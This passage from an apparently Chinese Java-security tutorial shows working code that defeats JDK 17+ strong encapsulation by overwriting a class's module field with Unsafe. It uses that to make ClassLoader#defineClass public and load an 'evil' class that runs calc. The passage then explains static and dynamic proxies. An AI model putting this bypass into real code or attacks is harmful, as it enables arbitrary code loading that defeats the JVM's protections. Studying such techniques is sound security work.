reflectionClass = Class.forName(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] classBuffer = reflectionClass.getResourceAsStream(<span class="string">&quot;Reflection.class&quot;</span>).readAllBytes();</span><br><span class="line">    Class&lt;?&gt; reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">fieldFilterMap</span> <span class="operator">=</span> reflectionAnonymousClass.getDeclaredField(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMap.getType().isAssignableFrom(HashMap.class)) &#123;</span><br><span class="line">        unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMap), <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] clz = Class.class.getResourceAsStream(<span class="string">&quot;Class.class&quot;</span>).readAllBytes();</span><br><span class="line">    Class&lt;?&gt; classAnonymousClass = unsafe.defineAnonymousClass(Class.class, clz, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reflectionData</span> <span class="operator">=</span> classAnonymousClass.getDeclaredField(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">    unsafe.putObject(Class.class, unsafe.objectFieldOffset(reflectionData), <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里置空 <code>fieldFilterMap</code> 字段时为了获取该字段的偏移用了 <code>Unsafe#defineAnonymousClass</code> 方法进行绕过。由于 <code>defineAnonymousClass</code> 方法在 JDK 17 被正式移除，因此高版本 JDK 还需要寻找其他方法进行绕过。</p>
<h3 id="JDK-≥-17-setAccessible"><a href="#JDK-≥-17-setAccessible" class="headerlink" title="JDK ≥ 17 (setAccessible)"></a>JDK ≥ 17 (setAccessible)</h3><p>JDK17（以及高版本的 JDK16）针对 <code>checkCanSetAccessible</code> 的限制进一步增强。</p>
<h4 id="限制条件分析-2"><a href="#限制条件分析-2" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p>从 <strong>JDK 9</strong> 开始，<code>checkCanSetAccessible</code> 会在调用 <code>setAccessible(true)</code> 前做一次<strong>模块“开放”（opens）检查</strong>。核心判断就是：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果被反射类的包是对调用者开放的，返回 true</span></span><br><span class="line"><span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">    logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>在 <strong>JDK 9～15 的默认迁移模式</strong>（<code>--illegal-access=permit</code>）下，JRE 会把 <strong>JDK 8 就已存在的包</strong>（例如 <code>java.base/java.lang</code>）<strong>临时“打开”给所有未命名模块（ALL-UNNAMED）</strong>。因此当<strong>调用方在 classpath（未命名模块）</strong>时，这里 <code>isOpen(pn, callerModule)</code> 判定为 <strong>true</strong>，<code>setAccessible(true)</code> 得以放行，并打印“一次性”非法反射警告。</li>
<li>到了 <strong>JDK 16</strong>，默认改为<strong>强封装</strong>：不再默认“临时打开”，除非你<strong>显式</strong>选择“宽松模式”（仍然可用 <code>--illegal-access=permit</code> 恢复 JDK 9 的行为）。所以默认情况下 <code>isOpen(...)</code> 多半变为 <strong>false</strong>。</li>
<li>自 <strong>JDK 17</strong> 起，JDK 内部彻底<strong>强封装</strong>并<strong>移除了 <code>--illegal-access</code> 选项</strong>；不再做那种“自动临时打开”。因此 <code>declaringModule.isOpen(pn, callerModule)</code> 对诸如 <code>java.base/java.lang</code> 这类包将**不再返回 <code>true</code>**。若仍要深反射，必须显式加：<br> <code>--add-opens java.base/java.lang=ALL-UNNAMED</code>（或开到具体的命名模块），或在运行期调用 <code>Module::addOpens</code>。</li>
</ul>
<p>也就是说 <strong>JDK 16&#x2F;17+</strong> 默认不再自动 opens，<code>isOpen(...)</code> 因而返回 <strong>false</strong>，需要<strong>显式 <code>--add-opens</code></strong> 才能通过。</p>
<h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="修改-module-属性"><a href="#修改-module-属性" class="headerlink" title="修改 module 属性"></a>修改 module 属性</h5><p>前面在 JDK9 版本时我们已经提出了一个通过修改字段的访问属性来绕过 <code>checkCanSetAccessible</code> 的方法。然而这个方法需要我们修改被反射操作的对象成员的 <code>modifiers</code> 属性。</p>
<p>由于从 JDK 12 版本开始，<code>getDeclaredField</code> 方法限制增多，因此我们无法直接获取到 <code>modifiers</code> 属性然后通过 <code>Unsafe</code> 模块修改（由于这里是 <code>setAccessible</code> 加强因此根本不会考虑反射修改）。</p>
<p>如果直接利用 <code>Unsafe</code> 模块的 <code>Unsafe#defineAnonymousClass</code> 方法绕过字段获取，则会由于 JDK17 该方法删除而失败。</p>
<p>而前面绕过 <code>getDeclaredField</code> 的思路到 JDK17 版本时均已失效，因此同样无法获取字段。</p>
<ul>
<li>调用 <code>getDeclaredFields0</code> 方法在 <code>setAccessible</code> 这一步被禁止。</li>
<li>置空 <code>fieldFilterMap</code> 方法因 <code>Unsafe#defineAnonymousClass</code> 方法被移除而失效。</li>
</ul>
<p>不过对于 <code>getDeclaredFields0</code> 这个方法，在 <code>checkCanSetAccessible</code> 中还判断了很多条件，我们只要想办法让其中一个条件得到满足就能绕过。</p>
<p>由于 <code>fieldFilterMap</code> 没有过滤 <code>Class</code> 的 <code>module</code> 成员，因此一种常见的方法就是通过 <code>Unsafe</code> 修改当前调用者的模块为 <code>Object</code> 所在模块，这样就可以通过下面这条判断。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set by VM</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Module <span class="keyword">module</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回此类或接口所属的模块。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果此类表示一个数组类型，则此方法返回该元素类型的 &#123;<span class="doctag">@code</span> Module&#125;。</span></span><br><span class="line"><span class="comment"> * 如果此类表示一个原始类型或 void，则返回 &#123;<span class="doctag">@code</span> java.base&#125; 模块的 &#123;<span class="doctag">@code</span> Module&#125; 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果此类位于一个未命名的模块中，则返回该类加载器的 &#123;<span class="doctag">@linkplain</span></span></span><br><span class="line"><span class="comment"> * ClassLoader#getUnnamedModule() 未命名模块&#125; &#123;<span class="doctag">@code</span> Module&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回此类或接口所属的模块</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 9</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@spec</span> JPMS</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Module <span class="title function_">getModule</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt; declaringClass,</span></span><br><span class="line"><span class="params">                                      <span class="type">boolean</span> throwExceptionIfDenied)</span> &#123;</span><br><span class="line">    <span class="type">Module</span> <span class="variable">callerModule</span> <span class="operator">=</span> caller.getModule();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (callerModule == Object.class.getModule()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>当我们设置 <code>callerModule</code> 为 <code>Object.class.getModule()</code> 时，相当于关于 <code>setAccessible</code> 的防护已经被关闭了，此时不光是 <code>getDeclaredFields0</code>，其它任何属性我们都可以调用 <code>setAccessible(true)</code> 获取所有权限。</p>

    </div>
  </div>

<p>我们可以对前面的 <code>getDeclaredField</code> 方法进一步作如下改进：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取指定类及其父类中的声明字段（包括私有字段）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 需要查找的字段名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果找到指定名称的字段，则返回该字段对象；否则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Module</span> <span class="variable">objModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">    <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">    unsafe.getAndSetObject(Class.forName(Thread.currentThread().getStackTrace()[<span class="number">1</span>].getClassName()), offset, objModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历当前类及其所有父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取 Class 类的私有方法 getDeclaredFields0</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeclaredFields0</span> <span class="operator">=</span> Class.class.getDeclaredMethod(<span class="string">&quot;getDeclaredFields0&quot;</span>, <span class="type">boolean</span>.class);</span><br><span class="line">            <span class="comment">// 设置该方法可访问，因为它是私有方法</span></span><br><span class="line">            getDeclaredFields0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 调用 getDeclaredFields0 方法获取指定类的所有字段（包括私有字段，但不包括父类的字段）</span></span><br><span class="line">            Field[] fields = (Field[]) getDeclaredFields0.invoke(clazz, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历该类的字段数组，查找是否有匹配的字段</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldName.equals(field.getName())) &#123;</span><br><span class="line">                    <span class="comment">// 设置字段为可访问，以便后续可以修改或获取其值</span></span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> field; <span class="comment">// 返回找到的字段</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 发生异常时，抛出运行时异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 继续搜索父类中的字段，直到 clazz 为 null（即到达继承层级的顶端）</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果在所有继承层级中都未找到该字段，则返回 null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于我们无法直接调用 <code>Reflection</code> 的 <code>getCallerClass</code> 方法（因为此时 <code>setAccessible</code> 还没有被绕过），因此这里我通过 <code>Class.forName(Thread.currentThread().getStackTrace()[1].getClassName())</code> 来获取调用者对应的 <code>Class</code> 对象。</p>
<p>其中 <code>Thread.currentThread().getStackTrace()</code> 获取了当前线程的调用栈，返回结果是一个数组表示调用栈中的所有方法。</p>
<p>需要注意的是 <code>getStackTrace()</code> 返回的堆栈是反向的，第一个元素是当前方法（即调用 <code>getStackTrace</code> 的方法），所以调用栈的第一个元素是当前方法，第二个元素才是调用 <code>getStackTrace</code> 方法的上一个方法。</p>
<p>我们通过 <code>getClassName</code> 获取调用 <code>getStackTrace</code> 方法的上一个方法对应的类名，然后再使用 <code>Class.forName</code> 获取对应的 <code>Class</code> 对象</p>

    </div>
  </div>

<p>借助改进后的 <code>getDeclaredField</code> 我们成功的获取并修改了 <code>defineClass</code> 对应 <code>Method</code> 的 <code>Class</code> 对象的 <code>modifiers</code> 属性。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(defineClassMethod.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), (<span class="type">short</span>) Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; aClass = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">aClass.newInstance();</span><br></pre></td></tr></table></figure></div>

<p>另外我们还可以用修改 <code>final</code> 变量的思路代替 <code>Unsafe</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getDeclaredField(object.getClass(), fieldName);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(field.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">setFieldValue(defineClassMethod, <span class="string">&quot;modifiers&quot;</span>, Modifier.PUBLIC);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; aClass = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">aClass.newInstance();</span><br></pre></td></tr></table></figure></div>

<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>在 Java 编程中，代理模式是一种设计模式，它允许开发者<strong>在方法调用的前后插入额外的逻辑</strong>。这种技术在许多实际应用中非常有用，例如日志记录、事务管理和安全检查。Java 代理模式可以分为<strong>静态代理</strong>和<strong>动态代理</strong>。</p>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><h3 id="静态代理的概念"><a href="#静态代理的概念" class="headerlink" title="静态代理的概念"></a>静态代理的概念</h3><p>静态代理是指在编译时由开发者创建的代理类。代理类与被代理类实现相同的接口，并在代理类中调用被代理类的方法。代理类可以在调用方法前后添加额外的逻辑。</p>
<h3 id="静态代理的实现"><a href="#静态代理的实现" class="headerlink" title="静态代理的实现"></a>静态代理的实现</h3><p><strong>静态代理有两种实现方式：</strong></p>
<ul>
<li><strong>基于接口的实现</strong> ：代理类实现与目标类相同的接口，并通过接口调用目标对象的方法。基于接口的代理实现方式灵活，可以代理多个不同类的实例，因此耦合度较低。</li>
<li><strong>基于继承的实现</strong> ：代理类通过继承目标类来实现代理，通常会重写目标类的方法并添加额外功能。基于继承的代理只能代理特定的目标类，无法代理其他类。因此，它的<strong>耦合度较高</strong>，因为代理类和目标类紧密绑定。这种实现方式在实际中很少使用。</li>
</ul>
<p>我们以一个简单的服务接口 <code>Service</code> 和它的实现类 <code>RealService</code> 为例，展示静态代理的实现。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 演示“静态代理（Static Proxy）”模式的最小示例：</span></span><br><span class="line"><span class="comment"> * - 抽象角色：Service（约定能力）</span></span><br><span class="line"><span class="comment"> * - 真实角色：RealService（真正干活的实现）</span></span><br><span class="line"><span class="comment"> * - 代理角色：ServiceProxy（在调用前后织入额外逻辑，再转发给真实对象）</span></span><br><span class="line"><span class="comment"> * - 客户端：StaticProxyDemo（面向接口编程，只感知 Service）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对外暴露的统一能力；代理与真实对象都实现它</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 真实业务实现（被代理者）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealService</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 真实的业务逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代理类：与被代理类实现同一接口，持有被代理对象的引用；</span></span><br><span class="line"><span class="comment"> * 在转发调用前后可插入“横切逻辑”（鉴权、日志、事务、限流等）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceProxy</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="comment">/** 被代理的真实对象 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Service realService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过构造方法注入被代理对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> realService 真实业务对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceProxy</span><span class="params">(Service realService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realService = java.util.Objects.requireNonNull(realService);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 调用前：织入前置逻辑（例如：校验、记录日志、权限检查等）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before performing service...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 调用真实对象的方法（核心业务）</span></span><br><span class="line">        realService.perform();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 调用后：织入后置逻辑（例如：统计、清理、提交事务等）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;After performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 客户端：只依赖抽象（Service），通过代理间接使用真实对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建真实对象</span></span><br><span class="line">        <span class="type">RealService</span> <span class="variable">realService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealService</span>();</span><br><span class="line">        <span class="comment">// 创建代理对象并注入真实对象</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">serviceProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceProxy</span>(realService);</span><br><span class="line">        <span class="comment">// 客户端面向接口调用，感知不到内部前后增强的细节</span></span><br><span class="line">        serviceProxy.perform();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在上述代码中定义了 <strong><code>Service</code> 接口</strong>以及针对这个接口的<strong>代理类</strong>和<strong>实现类</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/static_proxy.svg"
                      alt="static_proxy"
                ></p>
<ul>
<li><strong>Service 接口</strong> ：定义了 <code>perform</code> 方法。</li>
<li><strong>RealService 类</strong> ：是 <code>Service</code> 接口的实现类，实际业务逻辑在此实现。</li>
<li><strong>ServiceProxy 类</strong> ：是静态代理类，控制对 <code>RealService</code> 的方法调用，允许在方法调用前后添加自定义逻辑。</li>
</ul>
<p>在 <code>main</code> 方法中，通过代理类 <code>ServiceProxy</code> 来调用实际的 <code>perform</code> 方法。这个过程就是静态代理。</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="动态代理的概念"><a href="#动态代理的概念" class="headerlink" title="动态代理的概念"></a>动态代理的概念</h3><p><strong>动态代理</strong>指在<strong>运行时</strong>为目标对象<strong>动态生成</strong>代理类并拦截方法调用的一种机制。它与静态代理的最大区别是：<strong>无需手写代理类</strong>，而是由运行时（或框架）按需生成代理字节码并加载。Java 提供了<strong>基于接口的动态代理</strong>和基<strong>于类的动态代理</strong>（通过第三方库实现，如 CGLIB）。</p>
<ul>
<li><strong>基于接口的动态代理</strong> ：<code>java.lang.reflect.Proxy + InvocationHandler</code>。只要有接口，就能在运行时生成实现该接口的 <code>$Proxy...</code> 类，并把方法调用分发给 <code>InvocationHandler#invoke(...)</code>。</li>
<li><strong>基于类的动态代理</strong> ：借助 CGLIB &#x2F; Byte Buddy 等库，通过<strong>生成目标类的子类</strong>并覆盖方法，在 <code>intercept(...)</code> 中织入逻辑。适用于<strong>没有接口</strong>或希望对具体类增强的场景。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>静态代理</strong>需要为每个被代理类型手写一个代理类；一旦接口或方法签名变动，这些代理类也要同步修改，样板代码多、维护成本高、耦合度大。</p>
